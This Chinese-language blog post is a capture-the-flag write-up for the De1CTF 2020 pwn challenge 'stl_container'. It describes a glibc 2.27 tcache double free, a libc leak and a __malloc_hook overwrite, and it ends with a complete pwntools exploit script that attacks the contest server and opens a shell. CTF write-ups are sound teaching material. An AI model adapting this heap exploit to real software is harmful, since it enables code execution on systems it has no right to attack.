---
title: De1CTF_2020 write up
date: 2020-05-04 17:41:34
tags: CTF
---
这个比赛属实不是人打的，建议改名为MC-CTF<!--more-->，wdnmd每个类型都有mc的题目，出题人记得签收刀片  
开局先贴一张图且膜拜一波publicQi师傅，解那个code_runner写了五百多行代码，和别人交流从下午三点聊到早上5点  
![](D1.png)
而且比赛就没有点阳间的pwn，都是些什么玩意儿，属实给👴整吐了  
一个C艹写的菜单堆，一个套十五六层逆向算法的mips，一个CVE，一个Vm-pwn，一个Android-pwn，这是人做的？？？  
![](D2.jpg)
我搞出来这题是和Theffth小姐姐一起做的，她leak了libc，我调出了getshell  
stl_container是C艹写的菜单堆，glibc2.27，有4个功能，每个功能里面分别有三个功能，大概像这样  
![](D3.png)
然后C艹看不懂，IDA都不开，直接盲调，测试得到每个功能最多创建两个chunk，而且都是0xa0大小的，vector功能存在double free，因为是2.27，可以直接free同一块chunk两次  
接着就是瞎jb调，然后发现，把tcache填满后，利用double free，就可以看到main_arena+96链进了unsorted bin，就可以leak libc了  
具体操作如下  
①将所有chunk都申请出来，然后全部free  
②再次free vector中的chunk0，形成double free  
就会看到，大概长这样  
![](D4.png)
③再瞎jb调一通，会发现，把queue和stack的chunk全部申请回来之后，再申请一个vector中的chunk0，show一下，就能leak出meain_arena+96的地址  
大概长这样  
![](D5.jpg)
快乐！  
接着，我的一开始思路是再次把tcache填满，然后可以用别的bin打一打，因为我不是很会tcache  
④leak完后将queue和stack中的chunk都free了（这步为什么要这样做，我也不知道，反正不这样做就没法getshell）  
⑤再次add一个vector中的chunk0，并free 0两次，构造double free  
⑥add一个vector中的chunk1，并写入malloc_hook-0x13  
然后就会惊奇的发现  
![](D6.png)
⑦再申请一个vector chunk，里面写one_gadget，就能add到已malloc_hook-0x13为地址的chunk并且把one_gadget写进malloc_hook去了  
然后我调的时候没有x/gx，没显示完，大概长这样，我还以为只写入了一部分  
![](D7.png)
然后我还调了一波偏移，其实0x13的时候应该就已经写进去了
![](D8.png)  
![](D9.png)
快乐！！！  
exp  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
import sys
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './stl_container' 
local = 0
if local == 1:
    p=process(binary)
else:
    p=remote("134.175.239.26",8848)
elf=ELF(binary)
libc=ELF("libc-2.27.so")
def Ladd(content):
    p.recvuntil(">> ")
    p.send("1")
    p.recvuntil(">> ")
    p.send("1")
    p.recvuntil("data:")
    p.send(content)
def vadd(content):
    p.recvuntil(">> ")
    p.send("2")
    p.recvuntil(">> ")
    p.send("1")
    p.recvuntil("data:")
    p.send(content)
def qadd(content):
    p.recvuntil(">> ")
    p.send("3")
    p.recvuntil(">> ")
    p.send("1")
    p.recvuntil("data:")
    p.send(content)
def sadd(content):
    p.recvuntil(">> ")
    p.send("4")
    p.recvuntil(">> ")
    p.send("1")
    p.recvuntil("data:")
    p.send(content)
def Lfree(index):
    p.recvuntil(">> ")
    p.send("1")
    p.recvuntil(">> ")
    p.send("2")
    p.recvuntil("index?")
    p.send(str(index))
def vfree(index):
    p.recvuntil(">> ")
    p.send("2")
    p.recvuntil(">> ")
    p.send("2")
    p.recvuntil("index?")
    p.send(str(index))
def qfree():
    p.recvuntil(">> ")
    p.send("3")
    p.recvuntil(">> ")
    p.send("2")
def sfree():
    p.recvuntil(">> ")
    p.send("4")
    p.recvuntil(">> ")
    p.send("2")
def Lshow(index):
    p.recvuntil(">> ")
    p.send("1")
    p.recvuntil(">> ")
    p.send("3")
    p.recvuntil("index?")
    p.send(str(index))
def vshow(index):
    p.recvuntil(">> ")
    p.send("2")
    p.recvuntil(">> ")
    p.send("3")
    p.recvuntil("index?")
    p.send(str(index))
def qshow(index):
    p.recvuntil(">> ")
    p.send("3")
    p.recvuntil(">> ")
    p.send("3")
    p.recvuntil("index?")
    p.send(str(index))
def sshow(index):
    p.recvuntil(">> ")
    p.send("4")
    p.recvuntil(">> ")
    p.send("3")
    p.recvuntil("index?")
    p.send(str(index))
def exp():
    Ladd(" ") # 0
    Ladd(" ") # 1
    vadd(" ") # 2
    vadd(" ") # 3
    qadd(" ") # 4
    qadd(" ") # 5
    sadd(" ") # 6
    sadd(" ") # 7
    Lfree(0)
    Lfree(1)
    vfree(0)
    vfree(1)
    qfree()
    qfree()
    sfree()
    sfree()
    vfree(0)
    qadd(" ")
    qadd(" ")
    sadd(" ")
    sadd(" ")
    vadd(" ")
    vshow(0)
    
    leak =  u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) 
    libc_base = leak - 0x3ebc20
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    realloc = libc_base + libc.sym['realloc']
    log.success("libc_base==>" + hex(libc_base))
    log.success("malloc_hook==>" + hex(malloc_hook))
    one_gadget = libc_base +   0x4f322   
    print "one==>" + hex(one_gadget)
    payload = p64(malloc_hook)
    qfree()
    qfree()
    sfree()
    sfree()

    vadd(" ")
    vfree(0)
    vfree(0)
    vadd(p64(malloc_hook-0x16))
    payload = "a" *0x16 + p64(one_gadget)
    vadd(payload)
    #gdb.attach(p)
    p.recvuntil(">> ")
    p.send("1")
    p.recvuntil(">> ")
    p.send("1")
    p.sendline("cat flag")
    p.interactive()
exp()
```  
末尾贴上队内其他师傅搞出来的题目的wp链接：  
https://mp.weixin.qq.com/s/InqX2yJB7zIIgT7GEN2iow